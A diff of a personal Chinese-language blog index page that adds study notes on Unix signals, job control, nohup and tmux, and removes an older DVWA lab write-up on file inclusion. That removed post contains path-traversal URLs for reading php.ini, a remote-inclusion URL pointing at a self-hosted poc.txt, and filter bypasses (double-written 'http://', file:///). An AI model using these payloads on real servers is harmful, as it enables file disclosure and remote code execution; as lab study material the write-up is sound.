@@ -160,6 +160,144 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/03/29/missing-semester/Command-line%20Environment/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wys的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/29/missing-semester/Command-line%20Environment/" class="post-title-link" itemprop="url">Command-line Environment</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-03-29 13:28:27 / Modified: 18:16:35" itemprop="dateCreated datePublished" datetime="2022-03-29T13:28:27+08:00">2022-03-29</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Missing-Semester/" itemprop="url" rel="index"><span itemprop="name">Missing-Semester</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="command-line-environment">Command-line Environment</h1>
+<h2 id="signal">SIGNAL</h2>
+<p>您的 <code>shell</code> 会使用 <code>UNIX</code> 提供的信号机制执行进程间通信。</p>
+<p>我们可以使用<code>man signal</code> 来查看<code>signal</code>的帮助文档。</p>
+<p>对于如下的 <code>python</code> 程序</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> signal, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler</span>(<span class="params">signum, time</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nI got a SIGINT, but I am not stopping&quot;</span>)</span><br><span class="line"></span><br><span class="line">signal.signal(signal.SIGINT, handler)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    time.sleep(<span class="number">.1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\r&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>运行该程序后按 <code>ctrl+c</code> 会捕捉到信号程序继续运行。</p>
+<p>视频中按 <code>ctrl+\</code> 可以结束程序，但是我这里不知道为什么不行，得按 <code>ctrl+z</code>。</p>
+<p>在 <code>zsh</code> 下按 <code>ctrl+z</code> 会将进程 <code>suspended</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sleep 1000</span><br><span class="line">^Z</span><br><span class="line">[2]  + 894 suspended  sleep 1000</span><br></pre></td></tr></table></figure>
+<p>在<code>bash</code> 下<code>ctrl+z</code> 会将进程 <code>stopped</code> 不知道两者有何区别</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> sleep 1000</span><br><span class="line">^Z</span><br><span class="line">[1]+  Stopped                 sleep 1000</span><br></pre></td></tr></table></figure>
+<p>以下命令可以启动一个后台程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nohup sleep 2000 &amp;</span><br><span class="line">[2] 1053</span><br><span class="line">nohup: ignoring input and appending output to <span class="string">&#x27;nohup.out&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>一旦关闭终端（会发送另外一个信号<code>SIGHUP</code>），后台进程会终止。</p>
+<p>为了防止这种情况发生，您可以使用 <a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man1/nohup.1.html"><code>nohup</code></a> (一个用来忽略 <code>SIGHUP</code> 的封装) 来运行程序。</p>
+<p>最后 <code>&amp;</code> 的意思是在后台运行程序。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">jobs</span></span><br><span class="line">[1]  + suspended  sleep 1000</span><br><span class="line">[2]  - running    nohup sleep 2000</span><br></pre></td></tr></table></figure>
+<p>使用 <code>jobs</code> 可以查看运行或停止的进程。</p>
+<p>我们可以用 <code>bg</code> 继续执行进程。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">bg</span> %1</span><br><span class="line">[1]  - 1000 continued  sleep 1000</span><br><span class="line">[1]  - 1000 <span class="keyword">done</span>       sleep 1000</span><br></pre></td></tr></table></figure>
+<p><code>kill</code> 可以向进程发送信号</p>
+<p>如下，我们可以发送 <code>-STOP</code> 信号</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">jobs</span></span><br><span class="line">[2]  + running    nohup sleep 2000</span><br><span class="line"> <span class="built_in">bg</span> %1</span><br><span class="line">[1]  - 1000 continued  sleep 1000</span><br><span class="line">[1]  - 1000 <span class="keyword">done</span>       sleep 1000</span><br></pre></td></tr></table></figure>
+<p>kill可以发送 <code>-HUP</code>信号，这个信号和关掉中断时发送的信号相同。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -KILL %1</span><br><span class="line">[1]  + 1393 killed     nohup sleep 2000</span><br></pre></td></tr></table></figure>
+<p><code>-KILL</code> 信号可以杀死进程。</p>
+<p><code>fg</code> 命令可以将后台程序放到前台</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sleep 2000 &amp;</span><br><span class="line">[1] 1524</span><br><span class="line"></span><br><span class="line"><span class="built_in">fg</span> %1</span><br><span class="line">[1]  + 1524 running    sleep 2000</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="tmux">TMUX</h2>
+<p><code>TMUX</code>有三个重要的概念</p>
+<ul>
+<li><strong>Sessions</strong>
+<ul>
+<li><strong>Windows</strong>
+<ul>
+<li><strong>Panes</strong></li>
+</ul></li>
+</ul></li>
+</ul>
+<p><code>session</code>包含<code>Windows</code>，<code>Windous</code>包含<code>Panes</code>。</p>
+<p><code>tmux</code> 启动<code>tmux</code> ，<code>ctrl+b d</code> (先一起按下<code>ctrl+b</code>，然后一起松开<code>ctrl+b</code>，最后按下<code>d</code>) 保留运行的程序暂时退出<code>tmux</code>。</p>
+<p>默认前缀一般都是<code>ctrl+b</code>，但是很多人把它设置为 <code>ctrl+a</code>，因为它通常更加方便。</p>
+<p>tmux a可以重新返回终端。</p>
+<p>就是在wsl的zsh中每次都要切换下字体，有点烦。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux new -s &lt;session-name&gt;</span><br></pre></td></tr></table></figure>
+<p>可以创建一个名为<code>session-name</code> 的<code>session</code>，但是教程里是用 <code>-t</code> 不知道有什么区别。</p>
+<p>tmux ls查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tmux ls</span><br><span class="line">0: 1 windows (created Tue Mar 29 17:20:57 2022) [189x49]</span><br><span class="line">foobar: 1 windows (created Tue Mar 29 17:38:50 2022) [189x49]</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux a -t &lt;session-name&gt;</span><br></pre></td></tr></table></figure>
+<p>可以进入指定名称的<code>session</code>。</p>
+<p><strong>Windows</strong></p>
+<ul>
+<li><p><code>&lt;C-b&gt; c</code> 创建一个新的窗口，使用 <code>&lt;C-d&gt;</code>关闭</p></li>
+<li><p><code>&lt;C-b&gt; N</code> 跳转到第 <em>N</em> 个窗口，注意每个窗口都是有编号的</p></li>
+<li><p><code>&lt;C-b&gt; p</code> 切换到前一个窗口</p></li>
+<li><p><code>&lt;C-b&gt; n</code> 切换到下一个窗口</p></li>
+<li><p><code>&lt;C-b&gt; ,</code> 重命名当前窗口</p></li>
+<li><p><code>&lt;C-b&gt; w</code> 列出当前所有窗口</p></li>
+</ul>
+<p><strong>plane</strong></p>
+<ul>
+<li><code>&lt;C-b&gt; "</code> 水平分割</li>
+<li><code>&lt;C-b&gt; %</code> 垂直分割</li>
+<li><code>&lt;C-b&gt; &lt;方向&gt;</code> 切换到指定方向的面板，<方向> 指的是键盘上的方向键</方向></li>
+<li><code>&lt;C-b&gt; z</code> 切换当前面板的缩放</li>
+<li><code>&lt;C-b&gt; [</code> 开始往回卷动屏幕。您可以按下空格键来开始选择，回车键复制选中的部分</li>
+<li><code>&lt;C-b&gt; &lt;空格&gt;</code> 在不同的面板排布间切换</li>
+</ul>
+<p><code>htop</code> 可以查看进程的资源占用情况。</p>
+<img src="/2022/03/29/missing-semester/Command-line%20Environment/03/29/missing-semester/Command-line%20Environment/image-20220329181623036.png" class>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/03/28/missing-semester/Data%20Wrangling/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -185,7 +323,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2022-03-28 11:08:27 / Modified: 21:08:29" itemprop="dateCreated datePublished" datetime="2022-03-28T11:08:27+08:00">2022-03-28</time>
+              <time title="Created: 2022-03-28 11:08:27 / Modified: 21:33:34" itemprop="dateCreated datePublished" datetime="2022-03-28T11:08:27+08:00">2022-03-28</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1032,122 +1170,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wys的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">文件包含漏洞</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-03-17 15:57:27" itemprop="dateCreated datePublished" datetime="2022-03-17T15:57:27+08:00">2022-03-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-03-19 10:44:27" itemprop="dateModified" datetime="2022-03-19T10:44:27+08:00">2022-03-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="文件包含">文件包含</h1>
-<h2 id="概念">概念</h2>
-<p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数<strong>（include()，require()和include_once()，require_once()）</strong>利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
-<h2 id="低等级">低等级</h2>
-<ol type="1">
-<li>在网页上，服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</li>
-</ol>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317213618855.png"></p>
-<p>可以看到依次点击可以返回<code>file1.php</code>、<code>file2.php</code>、<code>file3.php</code> 的内容</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215051380.png"></p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215106647.png"></p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215122724.png"></p>
-<p>随便输入一个文件名</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215230874.png"></p>
-<p>报错，页面显示错误信息，没有这个文件（因为不是系统），但是暴露了服务器文件的绝对路径，于是根据经验找到了一些有趣的东西</p>
-<p>构造绝对路径：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.19.1*.*/dvwa/vulnerabilities/fi/?page=E:\software\phpstudy_pro\WWW\DVWA\php.ini</span><br></pre></td></tr></table></figure>
-<p>构造相对路径：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.19.1*.*/dvwa/vulnerabilities/fi/?page=..\..\..\..\..\software\phpstudy_pro\WWW\DVWA\php.ini</span><br></pre></td></tr></table></figure>
-<p>可以得到文件的内容：</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215412124.png"></p>
-<h3 id="远程文件包含">远程文件包含</h3>
-<p>在服务器的php配置中，当选项allow_url_fopen与allow_url_include为开启状态 时，服务器会允许包含远程远程服务器上的文件，如果对文件来源没有检查， 就会导致 任意远程代码执行，还记得前面的这句话：服务器包含文件时，不管文件后缀是否是 php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
-<p>我们新建一个txt文件，输入以下内容：</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220328003.png"></p>
-<p>我们用python创建一个文件服务器</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220304856.png"></p>
-<p>可以看到我们成功创建了一个文件服务器并上传了一个文件：</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220358559.png"></p>
-<p>我们通过输入url</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.19.*.*/dvwa/vulnerabilities/fi/?page=http://10.19.*.*:8000/poc.txt</span><br></pre></td></tr></table></figure>
-<p>可以成功的得到php的信息</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220913282.png"></p>
-<h3 id="中等级">中等级</h3>
-<p>1.查看代码可知，Medium级别的代码增加了str_replace函数，对page参数进行了一定的 处理，将”http:// ”、”https://”、 ” ../”、”..”替换为空字符，即删除，对于相对路径包含 以及远程文件包含有一定的防御作用。</p>
-<p>2.文件包含的限制绕过 使用str_replace函数是极其不安全的，因为可以使用双写绕过规则，比如像下面这样~~page=hthttp://tp://106.13.129.216:8000/phpinfo.txt但str_replace函数会将中间的http：//删除，于是就只剩下http://106.13.129.216:8000/phpinfo.txt，相对路径也可以通过类似方法绕过，同时，相对路径不在防御范围内，所以还是可以直接用。</p>
-<p>通过大小写也可以绕过。</p>
-<p>相对路径可以通过以下方式绕过。</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317221636399.png"></p>
-<h2 id="高等级">高等级</h2>
-<p>1.可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
-<p>2.漏洞利用 High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以 利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个 本地文件时，用的就是file协议。</p>
-<p>我们在前面加上file:///就可以打开文件</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1217,7 +1239,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-count">29</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
